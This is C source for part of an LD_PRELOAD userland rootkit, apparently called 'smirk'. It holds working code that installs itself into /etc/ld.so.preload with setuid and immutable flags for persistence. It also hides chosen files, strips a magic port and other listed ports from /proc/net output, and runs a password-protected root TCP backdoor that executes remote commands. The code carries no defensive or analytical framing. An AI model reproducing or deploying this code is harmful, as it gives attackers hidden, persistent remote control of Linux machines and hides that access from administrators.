#include "utils.h"

/*
 * Function:  matches_reg 
 * --------------------
 * matches regular expression
 *
 *  reg: regular expression
 *  str: string to be matched
 *
 *  returns: 1 if matches otherwise 0  
 */
int matches_reg(const char *reg, const char *str){
    regex_t regex;
    int reti = regcomp(&regex, reg, REG_EXTENDED);
    if (reti){
        return 0;
    }
    reti = regexec(&regex, str, 0 , NULL, 0);
    if (!reti){
        return 1;
    }
    return 0;
}

/*
 * Function:  is_magicfile
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_magicfile(const char *filename){
    char *file = basename(filename);
    char magic_re[256] = "(^ld\\.so\\.preload$|";
    strcat(magic_re, MAGIC_PREFIX);
    strcat(magic_re,")");
    return matches_reg(magic_re, file);
}

/*
 * Function:  is_net_file
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_net_file(const char *pathname){
    return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
}

/*
 * Function:  fake_netstat
 * --------------------
 * creates a fake netstat file given the original and purging MAGIC_PORT
 * and other jolly ports found in PORTSPOOF_FILE ('\n' split) 
 *
 *  pathname: full the path name
 *  newfile: pointer to new filename string that will be filled
 *
 *  returns: 1 if works otherwise 0  
 */
int fake_netstat(char *pathname, char *newfile){
    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }
    FILE *real_fp = hooked_fopen(pathname, "r");
    if (!real_fp){
        return 0;
    }
    strcpy(newfile,FAKE_NETSTAT_FILE);
    char *proto = basename(pathname);
    strcat(newfile,proto);
    FILE *fake_fp = hooked_fopen(newfile,"w");

    struct stat buffer;
    char ports[65535][7];
    int maxp = 1;
    sprintf(ports[0], ":%04X ", MAGIC_PORT);

    if (stat(PORTSPOOF_FILE, &buffer) == 0){
        FILE *pf = hooked_fopen(PORTSPOOF_FILE, "r");
        char line[32];
        do {
            read_line(fileno(pf), line, 32);
            int port = atoi(line);
            if (port){
                char hex_port[7];
                sprintf(hex_port, ":%04X ", port);
                int found = 0;
                for (int x = 0; x < maxp; x++){
                    if (strcmp(hex_port, ports[x]) == 0){
                        found = 1;
                        break;
                    }
                }
                if (found){
                    break;
                }
                #ifdef DEBUG
                printf("[-] hiding port %d -> %04X\n", port, port);
                #endif
                fflush(stdout);
                sprintf(ports[maxp], "%s", hex_port);
                maxp ++;
            }
        } while(strcmp(line, "") != 0);
    }

    char str[1024];
    while (1){
        int rc = read_line(fileno(real_fp), str, 1024);
        if (strcmp(str, "") == 0){
            break;
        }
        int towrite = 1;
        for (int x = 0; x < maxp; x++){
            if (strstr(str, ports[x]) != NULL){
                towrite = 0;
                break;
            }
        }
        if (towrite){
            if (rc){
                fprintf(fake_fp, "%s\n", str);
            }
            else{
                fprintf(fake_fp, "%s", str);
            }
        }
    }
    fchmod(fileno(fake_fp), 0666);
    fclose(fake_fp);
    return 1;
}

/*
 * Function:  OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU
 * --------------------
 * Just to show who's the boss
 * 
 *  returns: shame who "strings"
 */
void OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU(){}


/*
 * Function:  install
 * --------------------
 * saves the library in MAGIC_PATH, sets premissions & flags and write path on ld.preload.so
 *
 *  returns: nothing
 */
void install(){
    struct stat buffer;
    if (stat(MAGIC_LIBPATH, &buffer) == 0){
        return;
    }
    Dl_info dl_info;
    dladdr((void*)OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU, &dl_info);
    char fname[PATH_MAX];
    realpath((char*)dl_info.dli_fname, fname);
    if (strcmp(MAGIC_LIBPATH, fname) != 0){
        #ifdef DEBUG
        printf("[-] installing lib in %s\n", MAGIC_LIBPATH);
        #endif
        // hook real functions and use them
        if (!hooked_fopen){
            hooked_fopen = load_libc("fopen");
        }
        if (!hooked_ioctl){
            hooked_ioctl = load_libc("ioctl");
        }
        FILE *fr = hooked_fopen(fname,"rb");
        FILE *fw = hooked_fopen(MAGIC_LIBPATH,"wb");
        if (!fw){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }

        // copy the shared library on the magic path
        char buff[1024];
        size_t n, m;
        do{
            n = fread(buff, 1, sizeof(buff), fr);
            if (n) m = fwrite(buff, 1, n, fw);
            else m = 0;
        } while ((n > 0) && (n == m));
        fclose(fr);
        fflush(fw);

        // set permission 04555 (setuid/read/execute) and flags IMMUTABLE and APPEND to the library
        unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
        int fd = fileno(fw);
        fchmod(fd, 04555);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fw);

        // store on ld.preload.so the path of shared library
        FILE *fld = hooked_fopen("/etc/ld.so.preload","w");
        if (!fld){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        fwrite(MAGIC_LIBPATH, 1, sizeof(MAGIC_LIBPATH), fld);
        fflush(fld);
        fd = fileno(fld);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fld);
    }
}

// if doesn't exist a Killswitch this function is useless
#ifdef KILLSWITCH
/*
 * Function:  uninstall
 * --------------------
 * unistall smirk from system
 *
 *  returns: nothing 
 */
void uninstall(){
    #ifdef DEBUG
    printf("[-] removing lib...\n");
    #endif
    if (!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }
    if (!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    unsigned long flags = 0;
    struct stat buffer;

    if (stat(MAGIC_LIBPATH, &buffer) == 0){
        FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
        if (!f){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        int fd = fileno(f);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(f);
        unlink(MAGIC_LIBPATH);
    }

    char ldpath[] = "/etc/ld.so.preload";
    if (stat(ldpath, &buffer) == 0){
        FILE *fld = hooked_fopen(ldpath, "r");
        if (!fld){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        int fd = fileno(fld);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fld);
        unlink(ldpath);
    }
}
#endif

/*
 * Function:  read_line
 * --------------------
 * given the socket fd the function store in buffer the string of max size bytes
 *
 *  fd: the file descriptor
 *  buffer: pointer to the buffer to store the string
 *  max_size: max size of the buffer
 *
 *  returns: nothing
 */
int read_line(int fd, char *buffer, int max_size){
    int l = 0;
    char c = 'X';
    while (c && c != '\n' && l < max_size){
        int rc = read(fd, &c, 1);
        if (rc <= 0){
            buffer[l] = '\0';
            return rc;
        }
        if (c != '\n'){
            buffer[l] = c;
        }
        else{
            buffer[l] = '\0';
        }
        l++;
    }
    buffer[l] = '\0';
    return 1;
}

/*
 * Function:  backdoor
 * --------------------
 * given the socket it spawn a shell with a password request
 *
 *  args: the pointer to the socket
 *
 *  returns: nothing
 */
void *backdoor(void *args){
    int fd = *((int *) args);
    // get password
    write(fd, "PASS>", 5);
    char buff[1024];
    read_line(fd, buff, sizeof(buff));
    if (strcmp(buff, PASSWORD) != 0){
        char lovephrase[] = "Fuck off.\n";
        write(fd, lovephrase, sizeof(lovephrase));
        close(fd);
        return NULL;
    }

    // manage shell
    write(fd,"CMD>",4);
    read_line(fd, buff, sizeof(buff));
    dup2(fd, 0); //stdin
    dup2(fd, 1); //stdout
    dup2(fd, 2); //stderr

    system(buff);
    shutdown(fd, 2);
    close(fd);
}

void start_tcp_backdoor(){
    if (geteuid() != 0){
        return;
    }
    #ifdef DEBUG
    printf("[-] starting tcp backdoor..")
    #endif
    int socket_desc;
    socket_desc=socket(AF_INET,SOCK_STREAM,0);
    if (socket_desc==-1){
        return;
    }
    
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(MAGIC_PORT);

    if (bind(socket_desc,(struct sockaddr *)&address,sizeof(address)) < 0){
        return;
    }
    listen(socket_desc, 1024);
    if (!hooked_accept){
        hooked_accept = load_libc("accept");
    }
    while (1){
        int size = sizeof(address);
        int rc = hooked_accept(socket_desc, &address, &size);
        if (rc > 0){
            pthread_t thread;
            int *pfd = malloc(sizeof(*pfd));
            *pfd = rc;
            pthread_create(&thread, NULL, backdoor, pfd);
        }
    }
}

int is_port_usable(int port){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        return 0;
    }
    struct sockaddr_in serv_addr;
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = port;
    if (bind(sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        return 0;
    }
    close(sock);
    return 1;
}
